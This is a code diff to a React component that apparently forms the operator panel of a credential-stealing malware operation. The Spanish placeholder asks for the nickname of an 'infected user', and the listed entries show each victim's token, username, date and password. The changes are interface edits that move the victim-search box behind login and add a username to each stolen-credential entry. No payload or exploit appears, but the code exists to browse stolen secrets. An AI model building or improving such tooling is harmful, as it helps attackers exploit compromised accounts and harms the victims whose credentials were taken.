@@ -11,7 +11,7 @@ const Tokens = ({user}) => {
 	const [tokens, setTokens] = useState([]);
 	const [gotTokens, setGotTokens] = useState([]);
 	const [search, setSearch] = useState("");
-	const [error, setError] = useState([]);
+	const [error, setError] = useState(null);
 	const [username, setUsername] = useState(null);
 
 	useEffect(() => {
@@ -58,17 +58,30 @@ const Tokens = ({user}) => {
 				<span>T</span>
 				okens disponibles
 			</h1>
-			<input 
-				type="text"
-				placeholder="Ingresa el nick de un usuario infectado..."
-				onChange={changeQuery} 
-			/>
 			<h2>{error}</h2>
-			{username ? <h2>Welcome back <span>{username}</span>!</h2> : ""}
+			{
+				username ? 
+					<>
+						<h2>Welcome back <span>{username}</span>!</h2> 
+						<input 
+							type="text"
+							placeholder="Ingresa el nick de un usuario infectado..."
+							onChange={changeQuery} 
+						/>
+					</>
+				: ""
+			}
+
 			<div className="tokens-box">
 				{
-					tokens.map(({token, date, password, _id}) => (
-						<GotTokens token={token} date={date} password={password} key={_id}/>
+					tokens.map(t => (
+						<GotTokens 
+							token={t.token} 
+							username={t.username} 
+							date={t.date} 
+							password={t.password} 
+							key={t._id}
+						/>
 					))
 				}
 			</div>
